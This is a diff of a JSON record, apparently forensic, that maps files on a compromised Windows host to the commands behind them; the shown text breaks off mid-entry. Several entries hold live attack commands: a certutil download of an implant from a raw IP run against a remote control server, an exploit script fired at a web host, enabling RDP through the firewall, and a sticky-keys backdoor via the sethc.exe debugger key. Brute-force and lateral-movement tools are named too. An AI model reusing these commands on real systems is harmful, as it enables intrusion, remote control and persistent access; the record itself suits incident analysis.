@@ -1,398 +1,398 @@
 [
     {
-        "filename": "  C:/Users/Public/agent.exe\"",
+        "filename": "  C:/Users/Public/agent.exe\\\"\"",
         "cmd": "cmd  /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
         "id": "0e881c511f479048c410c13ed48be35d",
         "key": "bdd446be98e9f20a34b3fc72d9f9813e"
     },
     {
-        "filename": "  C:/Users/Public/administrator_pass.txt\"",
-        "cmd": "agent",
+        "filename": "  C:/Users/Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/7D6D5BC99FBAD78A324FC7E52924C2A8\\\"\"",
+        "cmd": "null",
+        "id": "77d192d3aa3b53fa32ca4e97fa20733d",
+        "key": "49e1cfac14f62c737180b12e23344786"
+    },
+    {
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/INetCache/IE/69T5JAAG/sangforcat[2].exe\\\"\"",
+        "cmd": "null",
+        "id": "77d192d3aa3b53fa32ca4e97fa20733d",
+        "key": "83fd8be74bef197da769bf919e71e69e"
+    },
+    {
+        "filename": "  C:/Users/Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/7D6D5BC99FBAD78A324FC7E52924C2A8\\\"\"",
+        "cmd": "null",
+        "id": "77d192d3aa3b53fa32ca4e97fa20733d",
+        "key": "9d519ed81b50a266af994542cd731adf"
+    },
+    {
+        "filename": "  C:/Users/Public/administrator_pass.txt\\\"\"",
+        "cmd": "null",
         "id": "c88f5ef37edb18c47c1d5d0093d5f886",
         "key": "245b387a9a1e180ebfd70d1a0d367b7c"
     },
     {
-        "filename": "  C:/Users/Public/PhpStudyPoc.py\"",
-        "cmd": "agent",
+        "filename": "  C:/Users/Public/PhpStudyPoc.py\\\"\"",
+        "cmd": "null",
         "id": "c88f5ef37edb18c47c1d5d0093d5f886",
         "key": "26eb3e9896257199e8ffde19ff9e81c8"
     },
     {
-        "filename": "  C:/Users/Public/PhpStudyExp2.py\"",
-        "cmd": "agent",
+        "filename": "  C:/Users/Public/PhpStudyExp2.py\\\"\"",
+        "cmd": "null",
         "id": "c88f5ef37edb18c47c1d5d0093d5f886",
         "key": "63a09d0ca057fbedd777951166a49ab5"
     },
     {
-        "filename": "  C:/Users/Public/PAExec.exe\"",
-        "cmd": "agent",
+        "filename": "  C:/Users/Public/PAExec.exe\\\"\"",
+        "cmd": "null",
         "id": "c88f5ef37edb18c47c1d5d0093d5f886",
         "key": "74cc03385c9caa4fab2f13c96c67a132"
     },
     {
-        "filename": "  C:/Users/Public/nbtscan.exe\"",
-        "cmd": "agent",
+        "filename": "  C:/Users/Public/nbtscan.exe\\\"\"",
+        "cmd": "null",
         "id": "c88f5ef37edb18c47c1d5d0093d5f886",
         "key": "e72114ad6266a078783868dc71394306"
     },
     {
-        "filename": "  C:/Users/Public/WinBrute.exe\"",
-        "cmd": "agent",
+        "filename": "  C:/Users/Public/WinBrute.exe\\\"\"",
+        "cmd": "null",
         "id": "c88f5ef37edb18c47c1d5d0093d5f886",
         "key": "e9b9132d4ee4e86cdfb1113da92bf117"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Start Menu/desktop.ini\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "0233a9c9837206d6db263ad1485259b4"
     },
     {
-        "filename": "  C:/Users/Administrator/Documents/\\\ndesktop.ini\"",
+        "filename": "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "0242e4f0e52193f26ddc4285a13edc0f"
     },
     {
-        "filename": "  C:/ProgramData/Microsoft/Windows/\\\nStart Menu/Programs/desktop.ini\"",
+        "filename": "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "0774eaeb0cacd9031c772a84428285d2"
     },
     {
-        "filename": "  C:/Users/Administrator/Downloads/\\\ndesktop.ini\"",
+        "filename": "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "091f55ad48228c39e4189062ac2c3d4e"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/Application Shortcuts/desktop.ini\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "4284ddf2a145f225bfafa7bf57224ce6"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "6a9bc56e0cbdc62baae8764292130b1b"
     },
     {
-        "filename": "  C:/Users/Administrator/Music/desktop.ini\"",
+        "filename": "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "6af446a219f170662a3c70b07ef42f8a"
     },
     {
-        "filename": "  C:/ProgramData/Microsoft/Windows/\\\nStart Menu/desktop.ini\"",
+        "filename": "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "74832bf45ad57f4cc3dcd417bbbae76a"
     },
     {
-        "filename": "  C:/Users/Administrator/Desktop/desktop.ini\"",
+        "filename": "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "82698a556496049b8090e55b1dc31755"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Start Menu/Programs/desktop.ini\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "998b88b46402b2856a3c6d80081086db"
     },
     {
-        "filename": "  C:/ProgramData/Microsoft/Windows/\\\nStart Menu/Programs/System Tools/desktop.ini\"",
+        "filename": "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "be0cd82cb71dc1b215484da0fdcfe8ac"
     },
     {
-        "filename": "  C:/Users/Administrator/Videos/desktop.ini\"",
+        "filename": "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "d01a61a1b4526b6835dbfb098524be5d"
     },
     {
-        "filename": "  C:/Users/Administrator/Pictures/desktop.ini\"",
+        "filename": "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "d4aa3c3916d01b25a291a5063253b64a"
     },
     {
-        "filename": "  C:/Users/Public/Desktop/desktop.ini\"",
+        "filename": "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "e80c4fdb90ac5618b2a0db6d0b7f66b8"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/2MRF9BGPXM9FKVZ6C0Q0.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/2MRF9BGPXM9FKVZ6C0Q0.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
         "id": "04123a0c0bbbc0b2ded650454ed22d10",
         "key": "eb93b24637357c17daf48e083a6a1815"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/BYJOWPQW9QGG4DFAL2S4.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/BYJOWPQW9QGG4DFAL2S4.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/sethc.exe/  /f;REG query / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/",
         "id": "1bbe83746c4dc7bd98a5b1898d4e97a6",
         "key": "96475da9e9ec3ef60c64271a0640736c"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/C1SY1RQJZPQJ1EXGL80N.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/C1SY1RQJZPQJ1EXGL80N.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  cmd /c &apos;python PhpStudyExp2.py http://121.36.30.176/ / taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443/ &apos;",
         "id": "224ed451937e268f150946b3ae48c27d",
         "key": "e89c014c156a50f7edccb9b8c10f2ecf"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Roaming/\\\nMicrosoft/Windows/Recent/CustomDestinations/0M3SWYRK54YFWRWSK26V.temp\"",
+        "filename": "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/0M3SWYRK54YFWRWSK26V.temp\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "045dd584dbef86f6c600a50a3c89d7ca"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_2f1227e0-ab00-43cd-97f8-f4ee011ef97f\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_2f1227e0-ab00-43cd-97f8-f4ee011ef97f\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "122ef7310258ab61d6ba472f59f02a04"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b3f83a6a-820e-4c26-8136-ccd6cf5d5ebb\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b3f83a6a-820e-4c26-8136-ccd6cf5d5ebb\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "13ee3a358cd81a512ea528a33085b53f"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheIndex\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheIndex\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "179b3863dffc63bf7556aa9099aa1e83"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b83d2633-0023-4a6d-93a1-791ec67a168f\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b83d2633-0023-4a6d-93a1-791ec67a168f\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "1df12cf59999c4c66febbd4f2248b3c3"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_748ce76e-bb6b-4f5c-9dea-2d68f04a23bc\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_748ce76e-bb6b-4f5c-9dea-2d68f04a23bc\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "39ec51728eb244159216294d7c3c35ea"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_034bf43a-7faf-4dfc-986f-9eff6213ef9b\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_034bf43a-7faf-4dfc-986f-9eff6213ef9b\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "44374a342fde7844456725b08f785857"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_6ecece8f-3052-46e5-8f70-5764a15bf1e0\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_6ecece8f-3052-46e5-8f70-5764a15bf1e0\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "63345846db2d99c8c1dd14f9b50016a3"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ab5924a6-0048-40af-b534-6ed9c93e40f1\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ab5924a6-0048-40af-b534-6ed9c93e40f1\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "64cf6bbcc00192b23e9e26461736dc50"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1be7444e-aacb-4826-beed-3b4106d19982\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1be7444e-aacb-4826-beed-3b4106d19982\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "71e6a328aee92c6e5d9d6e5170492f29"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_7e913f01-86cd-492e-b792-112164d19fab\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_7e913f01-86cd-492e-b792-112164d19fab\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "76195d2cf4d28fa8b2be9364473702ac"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8a23c91a-9c79-49f4-831d-cd5d7c08b88a\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8a23c91a-9c79-49f4-831d-cd5d7c08b88a\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "9db7c42868b0e613ab1d594b33339de3"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_cef0e298-51a3-4c1e-af05-49f72b10845e\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_cef0e298-51a3-4c1e-af05-49f72b10845e\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "b3fcc40d9bac169016bbd72c65c438c9"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_9de0acc9-1ac2-4972-973c-67167f8fa73d\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_9de0acc9-1ac2-4972-973c-67167f8fa73d\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "b5c1c6a5e7207e2d716318687a9fc08b"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_26baa1b6-754e-420f-8718-61642a64ef7b\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_26baa1b6-754e-420f-8718-61642a64ef7b\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "c1d5e60f9189f1cc96b20634ea123d8f"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_16af9c7b-6571-4146-b6b2-a9156fdca690\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_16af9c7b-6571-4146-b6b2-a9156fdca690\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "cbd777df8c4ea61ecbb77db5c8d3f137"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1b8e200f-e5e1-4e88-9177-78c2207876f3\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1b8e200f-e5e1-4e88-9177-78c2207876f3\\\"\"",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
         "id": "37694d348df6bcce6491d529922d2f52",
         "key": "d14c02a50828d8412afc945ae87e180c"
     },
     {
-        "filename": "  C:/Users/Administrator/AppData/Local/\\\nMicrosoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_e7fbfa60-c296-4eb6-861c-56be374e1e53\"",
+        "filename": "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_e7fbfa60-c296-4eb6-861c-56be374e1e53\\\"\"",
